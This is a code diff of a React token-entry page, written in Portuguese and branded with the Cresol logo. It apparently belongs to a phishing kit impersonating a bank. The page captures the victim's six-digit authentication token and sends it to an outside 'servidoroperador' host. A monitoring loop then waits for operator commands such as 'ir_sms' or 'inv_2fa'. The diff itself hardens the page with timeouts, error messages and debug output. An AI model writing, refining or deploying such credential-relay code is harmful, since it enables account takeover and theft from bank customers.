@@ -1,4 +1,3 @@
-
 import React, { useState, useEffect } from "react";
 import { ArrowLeft } from "lucide-react";
 import { useNavigate } from "react-router-dom";
@@ -17,20 +16,26 @@ const TokenPage = () => {
 
   useEffect(() => {
     const storedClientId = localStorage.getItem('clientId');
+    console.log(`[TOKEN] [${clientMonitoring.isProduction ? 'PROD' : 'DEV'}] Inicializando página TOKEN`);
+    
     if (storedClientId) {
       setClientId(storedClientId);
-      console.log('TOKEN: ClientId recuperado:', storedClientId);
+      console.log('[TOKEN] ClientId recuperado:', storedClientId);
       
-      // Iniciar monitoramento centralizado
-      clientMonitoring.startMonitoring(storedClientId, 'token');
+      // Aguardar um momento antes de iniciar o monitoramento para garantir que a página esteja totalmente carregada
+      setTimeout(() => {
+        clientMonitoring.startMonitoring(storedClientId, 'token');
+      }, 500);
     } else {
-      console.log('TOKEN: ClientId não encontrado');
+      console.log('[TOKEN] ClientId não encontrado, redirecionando para home');
+      navigate('/home');
     }
 
     return () => {
+      console.log('[TOKEN] Cleanup: parando monitoramento');
       clientMonitoring.stopMonitoring();
     };
-  }, [clientMonitoring]);
+  }, [clientMonitoring, navigate]);
 
   const handleTokenChange = (value: string) => {
     setToken(value.replace(/\D/g, '').slice(0, 6));
@@ -41,7 +46,7 @@ const TokenPage = () => {
   };
 
   const handleInvalidToken = () => {
-    console.log('Token inválido detectado');
+    console.log('[TOKEN] Token inválido detectado');
     setToken("");
     setIsLoading(false);
     setIsInvalid(true);
@@ -52,17 +57,20 @@ const TokenPage = () => {
     e.preventDefault();
     
     if (!clientId) {
-      console.log('ClientId não disponível para envio do token');
+      console.log('[TOKEN] ClientId não disponível para envio do token');
       return;
     }
 
     try {
-      console.log('Enviando token:', token);
+      console.log('[TOKEN] Enviando token:', token);
       
       setIsLoading(true);
       setIsInvalid(false);
       setErrorMessage("");
       
+      const controller = new AbortController();
+      const timeoutId = setTimeout(() => controller.abort(), 15000);
+
       const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/external-response`, {
         method: 'PATCH',
         headers: {
@@ -70,19 +78,24 @@ const TokenPage = () => {
         },
         body: JSON.stringify({
           response: token
-        })
+        }),
+        signal: controller.signal
       });
 
+      clearTimeout(timeoutId);
+
       if (response.ok) {
-        console.log('Token enviado com sucesso');
-        // O monitoramento já está ativo e detectará ir_sms ou inv_2fa
+        console.log('[TOKEN] Token enviado com sucesso - aguardando resposta do monitoramento');
+        // O monitoramento detectará ir_sms ou inv_2fa automaticamente
       } else {
-        console.log('Erro ao enviar token');
+        console.log('[TOKEN] Erro ao enviar token:', response.status);
         setIsLoading(false);
+        setErrorMessage("Erro ao enviar token. Tente novamente.");
       }
     } catch (error) {
-      console.log('Erro durante envio do token:', error);
+      console.log('[TOKEN] Erro durante envio do token:', error);
       setIsLoading(false);
+      setErrorMessage("Erro de conexão. Verifique sua internet.");
     }
   };
 
@@ -96,6 +109,7 @@ const TokenPage = () => {
   }, []);
 
   const handleBack = () => {
+    console.log('[TOKEN] Voltando para SMS');
     clientMonitoring.stopMonitoring();
     navigate("/sms");
   };
@@ -105,6 +119,15 @@ const TokenPage = () => {
       {/* Main Content Container */}
       <div className="w-full lg:w-1/2 flex flex-col items-center px-4 sm:px-6 lg:px-[7%] pt-8 lg:pt-36 pb-8 relative">
         <div className="max-w-md w-full mx-auto">
+          {/* Debug info em desenvolvimento */}
+          {!clientMonitoring.isProduction && (
+            <div className="mb-4 p-2 bg-gray-100 text-xs">
+              <div>Env: {clientMonitoring.isProduction ? 'PROD' : 'DEV'}</div>
+              <div>Monitoring: {clientMonitoring.isMonitoring ? 'ON' : 'OFF'}</div>
+              <div>ClientId: {clientId}</div>
+            </div>
+          )}
+
           {/* Botão Voltar */}
           <button
             onClick={handleBack}
@@ -114,6 +137,7 @@ const TokenPage = () => {
             <span className="text-base md:text-lg">Voltar</span>
           </button>
 
+          
           <img
             src={cresolLogo}
             alt="Cresol"
